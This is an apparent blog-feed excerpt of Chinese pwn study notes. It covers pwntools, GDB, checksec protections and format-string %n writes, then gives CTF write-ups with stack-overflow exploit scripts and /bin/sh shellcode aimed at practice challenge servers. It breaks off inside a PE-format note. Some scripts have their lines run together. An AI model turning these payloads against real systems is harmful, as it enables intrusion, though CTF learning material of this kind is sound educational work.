title="pwntools使用"></a>pwntools使用</h3><p>学习网址：</p><p><a href="https://www.jianshu.com/p/6e528b33e37a">https://www.jianshu.com/p/6e528b33e37a</a></p><p><a href="https://zhuanlan.zhihu.com/p/83373740">https://zhuanlan.zhihu.com/p/83373740</a></p><h4 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一种连接方式，通过ip和port去连接</span></span><br><span class="line">conn = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8888</span>)  </span><br><span class="line"><span class="comment"># 第二种连接方式，通过ssh连接</span></span><br><span class="line">shell = ssh(host=<span class="string">&#x27;192.168.14.144&#x27;</span>, user=<span class="string">&#x27;root&#x27;</span>, port=<span class="number">2222</span>, password=<span class="string">&#x27;123456&#x27;</span>)</span><br></pre></td></tr></table></figure><p>IO模块：这个比较容易跟zio搞混，记住zio是read、write，pwn是recv、send</p><p>学习网址：</p><p><a href="https://blog.csdn.net/weixin_45556441/article/details/114166906">https://blog.csdn.net/weixin_45556441/article/details/114166906</a></p><p>一、context<br>context 是 pwntools 用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><p>一般来说我们设置context只需要简单的一句话:</p><p>context(os=’linux’, arch=’amd64’, log_level=’debug’)</p><p>或者 context(os=’linux’, arch=’amd64’)</p><p>这句话的意思是：</p><ol><li>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux</li><li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’</li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。<br>————————————————<br>1<br>2<br>3<br>4<br>二、汇编与shellcode<br>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用/bin/sh</li></ol><p>语句: shellcode = asm(shellcraft.sh())</p><p>print(asm(shellcraft.sh())) # 打印出汇编后的shellcode<br>1<br>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。</p><p>使用方法即:</p><p>context(os=’linux’, arch=’amd64(i386)’)</p><p>shellcode = asm(shellcraft.sh())</p><p>p.sendline(shellcode)</p><h4 id="发送和接受数据"><a href="#发送和接受数据" class="headerlink" title="发送和接受数据"></a>发送和接受数据</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">send(<span class="keyword">data</span>): 发送数据</span><br><span class="line">sendline(<span class="keyword">data</span>) : 发送一行数据，相当于在末尾加\n      </span><br><span class="line">recv(numb=<span class="number">4096</span>, timeout=default) : 给出接收字节数,timeout指定超时</span><br><span class="line">recvuntil(delims, drop=False) : 接收到delims的pattern</span><br><span class="line">（以下可以看作until的特例）</span><br><span class="line">recvline(keepends=True) : 接收到\n，keepends指定保留\n</span><br><span class="line">recvall() : 接收到EOF</span><br><span class="line">recvrepeat(timeout=default) : 接收到EOF或timeout</span><br><span class="line">interactive() : 与shell交互</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">conn.send(<span class="keyword">data</span>) #发送数据</span><br><span class="line">conn.sendline(<span class="keyword">data</span>) #发送一行数据，相当于在数据后面加\n</span><br><span class="line">#接收数据，numb制定接收的字节，timeout指定超时</span><br><span class="line">conn.recv(numb = <span class="number">2048</span>, timeout = default)</span><br><span class="line">#接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">conn.recvline(keepends=True)</span><br><span class="line">#接受数据直到我们设置的标志出现</span><br><span class="line">conn.recvuntil(<span class="string">&quot;Hello,World\n&quot;</span>,drop=fasle) </span><br><span class="line">conn.recvall()  #一直接收直到 EOF</span><br><span class="line">conn.recvrepeat(timeout = default)  #持续接受直到EOF或timeout</span><br><span class="line">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h4 id="ELF模块"><a href="#ELF模块" class="headerlink" title="ELF模块"></a>ELF模块</h4><p>获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e = ELF(<span class="string">&#x27;/bin/cat&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> hex(e.address)  <span class="comment"># 文件装载的基地址</span></span><br><span class="line">0x400000</span><br><span class="line"><span class="built_in">print</span> hex(e.symbols[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># 函数地址</span></span><br><span class="line">0x401680</span><br><span class="line"><span class="built_in">print</span> hex(e.got[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># GOT表的地址</span></span><br><span class="line">0x60b070</span><br><span class="line"><span class="built_in">print</span> hex(e.plt[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># PLT的地址</span></span><br><span class="line">0x401680</span><br></pre></td></tr></table></figure><h4 id="汇编与反汇编"><a href="#汇编与反汇编" class="headerlink" title="汇编与反汇编"></a>汇编与反汇编</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;mov eax, 0&#x27;</span>)   <span class="comment">#汇编</span></span><br><span class="line"><span class="string">&#x27;\xb8\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>disasm(<span class="string">&#x27;\xb8\x0b\x00\x00\x00&#x27;</span>)  <span class="comment">#反汇编</span></span><br><span class="line"><span class="string">&#x27;   0:   b8 0b 00 00 00          mov    eax,0xb&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="shellcode生成"><a href="#shellcode生成" class="headerlink" title="shellcode生成"></a>shellcode生成</h4><p><strong>pwnlib.shellcraft模块</strong>包含<strong>生成shell代码</strong>的函数。<br>其中的子模块声明结构，比如</p><ul><li>ARM架构: shellcraft.arm</li><li>AMD64架构: shellcraft.amd64</li><li>Intel 80386架构: shellcraft.i386</li><li>通用: shellcraft.common</li></ul><p>可以<strong>通过context设置架构</strong>，然后<strong>生成shellcode</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p><strong>调用gdb调试</strong> 在python文件中直接设置断点，当运行到该位置之后就会断下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./c&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure><h4 id="解题常用："><a href="#解题常用：" class="headerlink" title="解题常用："></a>解题常用：</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>   <span class="comment">//设置架构context.log_level = &#x27;debug&#x27; //显示log详细信息libc = ELF(&#x27;./libc-2.24.so&#x27;)  //加载库文件</span></span><br></pre></td></tr></table></figure><h3 id="GDB操作"><a href="#GDB操作" class="headerlink" title="GDB操作"></a>GDB操作</h3><p>学习网址：</p><p><a href="https://blog.csdn.net/chen1415886044/article/details/105094688/">https://blog.csdn.net/chen1415886044/article/details/105094688/</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g main.c -o main</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722160634.png" alt="在这里插入图片描述"></p><p><strong>设置断电</strong></p><p>break [行号]</p><p>b [函数名]</p><p>break test.c:6 if num&gt;0</p><p>当在num&gt;0时，程序将会在第6行断住。</p><p><strong>查看断点</strong></p><p>info breakpoints</p><p><strong>删除断点</strong></p><p>delete breakpoint</p><p>比如 delete 1</p><h3 id="checksec含义"><a href="#checksec含义" class="headerlink" title="checksec含义"></a>checksec含义</h3><p>学习网址：</p><p><a href="https://www.jianshu.com/p/6e528b33e37a">https://www.jianshu.com/p/6e528b33e37a</a></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722184517.png" alt="image-20210722184219109"></p><p>防护技术：</p><p><strong>RELRO</strong>:在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。（参考<a href="https://link.jianshu.com/?t=https://hardenedlinux.github.io/2016/11/25/RelRO.html">RELRO技术细节</a>）</p><p><strong>Stack</strong>: 栈溢出检查，用<strong>Canary金丝雀值</strong>是否变化来检测,Canary found表示开启。</p><p>金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。</p><p><strong>NX</strong>: No Execute，栈不可执行，也就是windows上的DEP。</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722184605.png" alt="image-20210722184605404"></p><p>DEP</p><blockquote><p>分析缓冲区溢出攻击，其根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP就是用来弥补计算机对数据和代码混淆这一天然缺陷的。</p></blockquote><p>DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。硬件DEP需要CPU的支持，AMD和Intel都为此做了设计，AMD称之为No-Execute Page-Protection（NX），Intel称之为Execute Disable Bit（XD）</p><p>Linux称为 NX 与 DEP原理相同</p><p><strong>PIE</strong>: position-independent executables, 位置无关的可执行文件，也就是常说的ASLR(Address space layout randomization) 地址随机化，程序每次启动基址都随机。</p><hr><p>学习网址：<a href="http://blog.wjhwjhn.com/archives/45/">http://blog.wjhwjhn.com/archives/45/</a></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722184221.png" alt="image-20210722184219109"></p><p>1.Relro<br>Relocation Read Only， 重定位表只读。重定位表即.got 和.plt 两个表。<br>NO RELRO： 可以写.dynamic，现在的软件不常见，如果是这个选项很有可能是一种对考点的暗示。<br>Partial RELRO： .dynamic 只读，比较常见，可以修改 got 表内容。<br>Full RELRO：无法利用 GOT 表进行攻击。</p><h2 id="2-Stack"><a href="#2-Stack" class="headerlink" title="2.Stack"></a>2.Stack</h2><p>一般由 <strong>Canary (金丝雀)</strong> 来保护，金丝雀原来是石油工人用来判断气体是否有毒。而应用于在栈保护上则是在初始化一个栈帧时在栈底（<strong>stack overflow</strong> 发生的高位区域的尾部）设置一个随机的 <strong>canary</strong> 值，当函数返回之时检测 <strong>canary</strong> 的值是否经过了改变，以此来判断 <strong>stack/buffer overflow</strong> 是否发生，若改变则说明栈溢出发生，程序触发 <strong>stack_chk_fail</strong> 函数退出程序。 注意：同一个程序的 <strong>canary</strong> 的值都是一样的，而且子进程也是一样的。<br>因此我们需要获取 <strong>Canary</strong> 的值，或者防止触发 <strong>stack_chk_fail</strong> 函数。<br>因为 <strong>Canary</strong> 的值具有不可预测性，所以需要动态的方法进行泄露，一般常用的方法就是通过<strong>格式化字符串</strong>漏洞来输出 <strong>Canary</strong> 的值，或者是用 <strong>[栈溢出，输出栈内容]</strong> 的形式来输出 <strong>Canary</strong><br>但是由于 <strong>Canary</strong> 的设计者考虑到了 <strong>Canary</strong> 被误泄露的可能性，因此强制规定 <strong>Canary</strong> 的最后两位必须是 00。所以在输出的时候会被 00 截断，而我们只需要多覆盖一位，把 \x00 给覆盖掉，然后读取的时候再替换成 \x00 即可。</p><p>我的理解：通过调试定位到 <strong>Canary</strong> 的地址，然后利用 <strong>%[OffSet]$x</strong> 来读取数据。**%[OffSet]** 表示往后移动 <strong>[OffSet]</strong> 个参数。<br>而且字符串漏洞泄露是可以利用 <strong>%n</strong> 来写入数据的，写入的数据为已经输出的字符串。</p><p>所以可以配合 <strong>printf (“p32 (地址)%[OffSet]% n”);</strong> <strong>[OffSet]</strong> 是指向 p32 (地址) 的位置，来达到写指定的 (地址) 的目的，这个例子应该写入的是一字节的 0x4。<br>而且当我们需要要对一个地址写入一个很大的数，例如 0x12345678 时，我们一般不直接写入，而是利用 h 或 hh，分若干次写入。</p><p>% d 用于读取 10 进制数值 % x 用于读取 16 进制数值<br>% s 用于读取字符串值 即泄露任意地址信息 (传入指针，访问指针位置的内容，到 x0 结束)<br>% n 用于把前面已经打印的长度写入某个内存地址（把栈的地址当作指针，向它指向的地址写）<br>% n 写入 4 个字节，% hn 写入 2 个字节，% hhn 写入 1 个字节。</p><h2 id="3-NX"><a href="#3-NX" class="headerlink" title="3.NX"></a>3.NX</h2><p><strong>Non-Executable Memory</strong>，不可执行内存。<br>了解 Linux 的都知道其文件有三种属性，即 rwx，而 NX 即没有 x 属性。<br>如果没有 w 属性，我们就不能向内存单元中写入数据，如果没有 x 属性，写入的 shellcode 就无法执行。<br>所以，我们此时应该使用其他方法来 pwn 掉程序，其中最常见的方法为 ROP (Return-Oriented Programming  返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn  掉程序的目的。<br>我的理解，不能在栈上直接写 <strong>Shellcode</strong> 并且执行，但是可以 ROP (即通过 <strong>ret</strong> 的时候转到的地址来控制程序运行权限)。</p><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="buuctf-rip"><a href="#buuctf-rip" class="headerlink" title="buuctf rip"></a>buuctf rip</h2><p>用file 和 checksec –file pwn1 </p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722184221.png" alt="image-20210722184219109"></p><p>没有任何防护技术</p><p>用ida打开看看汇编代码</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722192745.png" alt="image-20210722192745826"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722192811.png" alt="image-20210722192811082"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722192756.png" alt="image-20210722192756049"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722192817.png" alt="image-20210722192817599"></p><p>在看看s有多大（s为局部变量）</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722193433.png" alt="image-20210722193433038"></p><p>0F 到 01 15个</p><p>**注意到 后面还有 db 8 dup(?)     **</p><p>**db： 定义字节类型变量的伪指令     **</p><p>**dup()： 重复定义圆括号中指定的初值，次数由前面的数值决定    **</p><p><strong>?： 只分配存储空间，不指定初值</strong></p><p>动调查看偏移</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722203848.png" alt="image-20210722203847947"></p><p>401186</p><p>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *s = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28466</span>)buf = <span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>  + p64(<span class="number">0x401186</span>)s.sendline(buf)s.interactive()反弹shell得到flag</span><br></pre></td></tr></table></figure><p>但是如果考虑堆栈平衡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *s = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28466</span>)payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">23</span> + p64(<span class="number">0x401186</span> + <span class="number">1</span>)s.sendline(payload)s.interactive()</span><br></pre></td></tr></table></figure><p>我们还需要从栈里出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *s = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28466</span>)buf = <span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x401198</span>) + p64(<span class="number">0x401186</span>)s.sendline(buf)s.interactive()<span class="comment">#&#x27;a&#x27; 前面的 b是为了防止python3运行时出现以下错误</span></span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>用ida查看</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210723194039.png" alt="image-20210723194039329"></p><p>这都是在主函数里不用考虑覆盖rbp的问题，就不用管，直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26353</span>)payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">44</span> +  p64(<span class="number">0x41348000</span>)r.sendline(payload)r.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210726100343.png" alt="image-20210726100333022"></p><p>i386-32</p><p>用ida打开，查看关键函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725202445.png" alt="image-20210725202445260"></p><p>fget(s,32,edata)限制了输入的字符串的长度为32，无法常规溢出</p><p>接着看看函数后面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::allocatorallocator类详解：https://blog.csdn.net/fengbingchun/article/details/78943527这就相当于分配内存</span><br></pre></td></tr></table></figure><p>发现题目将输入的字符串中的”I”转为”you”，在通过strcpy赋给s，可以通过输入多个”I”达到栈溢出的目的，题目给s分配了0x3c的空间，那就是需要20个”I”，看看需要溢出到哪</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210726104903.png" alt="image-20210726104903528"></p><p>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25135</span>)payload = <span class="string">b&#x27;I&#x27;</span>* <span class="number">20</span> + <span class="string">b&quot;a&quot;</span>*<span class="number">4</span> + p32(<span class="number">0x8048F0D</span>)r.sendline(payload)r.interactive()</span><br></pre></td></tr></table></figure><h2 id="EasyCTF-2017-doubly-dangerous"><a href="#EasyCTF-2017-doubly-dangerous" class="headerlink" title="EasyCTF 2017-doubly_dangerous"></a>EasyCTF 2017-doubly_dangerous</h2><p>用checksec查看</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091118538.png" alt="image-20210809111822304"></p><p>用ida打开简单分析</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091121091.png" alt="image-20210809112141033"></p><p>直接利用get溢出到give_flag()失败</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *setting = 0<span class="keyword">if</span> setting == <span class="number">0</span>:    r = process(<span class="string">&quot;./doubly_dangerous&quot;</span>)<span class="keyword">else</span>:    r = remote(<span class="string">&quot;&quot;</span>,)s = 0x08048665payload =  <span class="string">&#x27;a&#x27;</span>*<span class="number">64</span> + p32(s)r.recvuntil(<span class="string">&quot;Give me a string:&quot;</span>)r.sendline(payload)r.interactive()</span><br></pre></td></tr></table></figure><p>换一种思路，溢出到v5那把v5改成11.28125</p><p>先看一下主函数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091127700.png" alt="image-20210809112745640"></p><p><strong>浮点指令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fld 类似于 pushfstp 类似于 popfadd 类似于 addfucomip 类似于 cmp</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091128842.png" alt="image-20210809112823791"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091128925.png" alt="image-20210809112840882"></p><p>浮点数是大端存储，所以需要将v5覆盖为0x41348000</p><p>现在来找覆盖点</p><p>gdb运行输入aaaa</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091130508.png" alt="image-20210809113026461"></p><p>存放s[64]的位置是0xffffcefc</p><p>存v5的位置是0xffffcf3c</p><p>相减得到距离为0x40</p><p>那就是上脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *setting = 0<span class="keyword">if</span> setting == <span class="number">0</span>:    r = process(<span class="string">&quot;./doubly_dangerous&quot;</span>)<span class="keyword">else</span>:    r = remote(<span class="string">&quot;&quot;</span>,)s = 0x41348000payload =  <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(s)r.recvuntil(<span class="string">&quot;Give me a string:&quot;</span>)r.sendline(payload)r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn初学笔记&quot;&gt;&lt;a href=&quot;#pwn初学笔记&quot; class=&quot;headerlink&quot; title=&quot;pwn初学笔记&quot;&gt;&lt;/a&gt;pwn初学笔记&lt;/h1&gt;&lt;p&gt;师傅们的学习博客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>PE学习笔记</title>
    <link href="http://example.com/2021/08/13/PE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2021/08/13/PE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-08-13T11:39:43.642Z</published>
    <updated>2021-08-13T07:51:24.856Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE学习笔记"><a href="#PE学习笔记" class="headerlink" title="PE学习笔记"></a>PE学习笔记</h1><p>有一说一，自己看完书在看看视频，可以自己写一两个程序（比如输出hello world）来实战分析一下，印象会更深。</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715192740.png" alt="image-20210704165647109"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193305.png" alt="image-20210324212714865"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193312.png" alt="文件图"></p><h2 id="DOS属性说明"><a href="#DOS属性说明" class="headerlink" title="DOS属性说明"></a>DOS属性说明</h2><p>MZ标识（e_magic）不能动，+3C位置的e_lfanew不能动，中间的都可以改动，中间的是给16位看的，现在是32/64位的系统，不需要这部分。同时DOS Stub可以随意更改不影响。</p><h2 id="PE头属性说明"><a href="#PE头属性说明" class="headerlink" title="PE头属性说明"></a>PE头属性说明</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_IMAGE_NT_HEADERS &#123;</span><br><span class="line">DWORD Signature; <span class="comment">//PE标识（4字节</span></span><br><span class="line">IMAGE_FILE_HEADER FileHeader;<span class="comment">//标准PE头（20字节</span></span><br><span class="line">IMAGE_OPTIONAL_HEADER32 OptionalHeader;<span class="comment">//扩展PE头（224字节</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32,*PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h3 id="PE标识"><a href="#PE标识" class="headerlink" title="PE标识"></a>PE标识</h3><p>0004550h=======”PE00”</p><h3 id="IMAGE-FILE-HEADER-FileHeader-标准PE头"><a href="#IMAGE-FILE-HEADER-FileHeader-标准PE头" class="headerlink" title="IMAGE_FILE_HEADER FileHeader;标准PE头"></a>IMAGE_FILE_HEADER FileHeader;标准PE头</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct__IMAGE_FILE_HEADER &#123;</span><br><span class="line">WORD Machine;<span class="comment">//可以运行在什么样的CPU上任意:0Intel 386以及后续:14C x64:8664</span></span><br><span class="line">wORD NumberOfSections;<span class="comment">//表示节的数量</span></span><br><span class="line">DWORD TimeDateStamp;<span class="comment">//编译器填写的时间戳与文件属性里面(创建时间、修改时间)无关（1970年到编译器编译段程序</span></span><br><span class="line">DWORD PointerToSymbolTable;<span class="comment">//调试相关</span></span><br><span class="line">DWORD NumberOfSymbols;<span class="comment">//调试相关</span></span><br><span class="line">WORD SizeOf0ptionalHeader;<span class="comment">//可选PE头的大小(32位PE文件:OxE0 64位PE文件:OxF0)</span></span><br><span class="line">WORD Characteristics;<span class="comment">//文件属性</span></span><br><span class="line">&#125;IMAGE_FILE_HEADER,*PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p>C:\Windows下两个文件夹</p><p>System32存储64位程序，SysWOW64存储32位程序</p><p> Characteristics 将他的字节转存二进制</p><p>比如<img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193320.png" alt="image-20210324215838182"></p><p>此时是左小右大，小端存储要修改位置</p><p>0127</p><p>转成二进制</p><p>0000 0001 0010 0111</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193324.png" alt="image-20210325125852801"></p><h3 id="IMAGE-OPTIONAL-HEADER32-OptionalHeader-扩展PE头"><a href="#IMAGE-OPTIONAL-HEADER32-OptionalHeader-扩展PE头" class="headerlink" title="IMAGE_OPTIONAL_HEADER32 OptionalHeader;扩展PE头"></a>IMAGE_OPTIONAL_HEADER32 OptionalHeader;扩展PE头</h3><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193517.png" alt="image-20210325170912232"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193513.png" alt="image-20210325171126065"></p><h2 id="节表数据结构"><a href="#节表数据结构" class="headerlink" title="节表数据结构"></a>节表数据结构</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193333.png" alt="image-20210325190344706"></p><p><strong>节属性说明</strong></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193337.png" alt="image-20210325190357790"></p><h3 id="RVA和FOA的转换"><a href="#RVA和FOA的转换" class="headerlink" title="RVA和FOA的转换"></a>RVA和FOA的转换</h3><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193348.png" alt="image-20210325190859385"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 